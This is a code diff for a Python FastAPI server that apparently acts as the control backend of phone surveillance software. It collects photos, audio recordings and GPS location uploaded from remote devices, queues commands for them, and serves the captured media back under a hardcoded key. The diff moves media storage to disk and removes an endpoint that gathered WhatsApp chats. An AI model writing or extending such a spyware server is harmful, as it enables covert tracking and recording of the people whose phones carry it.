@@ -1,16 +1,18 @@
 from fastapi import FastAPI, Request, HTTPException, UploadFile, File
+from fastapi.responses import FileResponse
 import time
+import os
 
 app = FastAPI()
 API_KEY = "MY_SECRET_KEY_123" 
 
 device_data = {} 
 command_queue = []
-latest_image_bytes = None
-latest_audio_bytes = None
 latest_location = "No location yet"
-latest_wa_chats = []
-debug_msg = "No debug info"
+
+# Save files to disk so they don't get lost in RAM
+PHOTO_FILE = "latest_photo.jpg"
+AUDIO_FILE = "latest_audio.m4a"
 
 def check_key(request: Request):
     if request.headers.get("X-Key") != API_KEY:
@@ -29,16 +31,16 @@ async def get_commands(request: Request):
 
 @app.post("/upload_photo")
 async def upload_photo(request: Request, file: UploadFile = File(...)):
-    global latest_image_bytes
     check_key(request)
-    latest_image_bytes = await file.read()
+    with open(PHOTO_FILE, "wb") as f:
+        f.write(await file.read())
     return {"status": "ok"}
 
 @app.post("/upload_audio")
 async def upload_audio(request: Request, file: UploadFile = File(...)):
-    global latest_audio_bytes
     check_key(request)
-    latest_audio_bytes = await file.read()
+    with open(AUDIO_FILE, "wb") as f:
+        f.write(await file.read())
     return {"status": "ok"}
 
 @app.post("/location")
@@ -49,17 +51,6 @@ async def post_location(request: Request):
     latest_location = f"Lat: {data.get('lat')}, Lon: {data.get('lon')}"
     return {"status": "ok"}
 
-@app.post("/wa")
-async def post_wa(request: Request):
-    global latest_wa_chats
-    check_key(request)
-    data = await request.json()
-    if "messages" in data:
-        for msg in data["messages"]:
-            latest_wa_chats.insert(0, msg)
-        latest_wa_chats = latest_wa_chats[:50] 
-    return {"status": "ok"}
-
 @app.get("/state")
 async def get_state(request: Request):
     check_key(request)
@@ -67,24 +58,22 @@ async def get_state(request: Request):
     active_devices = {k: v for k, v in device_data.items() if now - v.get("last_seen", 0) < 15}
     return {
         "devices": active_devices, 
-        "has_image": latest_image_bytes is not None, 
-        "has_audio": latest_audio_bytes is not None,
-        "location": latest_location,
-        "wa_chats": latest_wa_chats,
-        "debug_msg": debug_msg
+        "has_image": os.path.exists(PHOTO_FILE), 
+        "has_audio": os.path.exists(AUDIO_FILE),
+        "location": latest_location
     }
 
 @app.get("/get_photo")
 async def get_photo(request: Request):
     check_key(request)
-    from fastapi.responses import Response
-    return Response(content=latest_image_bytes, media_type="image/jpeg")
+    if not os.path.exists(PHOTO_FILE): raise HTTPException(status_code=404)
+    return FileResponse(PHOTO_FILE, media_type="image/jpeg")
 
 @app.get("/get_audio")
 async def get_audio(request: Request):
     check_key(request)
-    from fastapi.responses import Response
-    return Response(content=latest_audio_bytes, media_type="audio/mp4")
+    if not os.path.exists(AUDIO_FILE): raise HTTPException(status_code=404)
+    return FileResponse(AUDIO_FILE, media_type="audio/mp4")
 
 @app.post("/queue_cmd")
 async def queue_command(request: Request):
